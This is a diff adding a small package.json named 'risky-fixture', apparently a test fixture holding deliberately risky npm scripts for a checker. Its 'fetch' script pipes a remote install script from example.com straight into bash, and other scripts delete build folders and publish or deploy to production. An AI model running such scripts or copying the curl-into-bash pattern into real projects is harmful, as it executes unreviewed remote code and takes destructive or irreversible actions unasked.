@@ -1,0 +1,11 @@
+{
+  "name": "risky-fixture",
+  "private": true,
+  "scripts": {
+    "clean": "rm -rf dist coverage",
+    "deploy": "vercel deploy --prod",
+    "publish": "npm publish",
+    "fetch": "curl https://example.com/install.sh | bash",
+    "test": "node --test"
+  }
+}
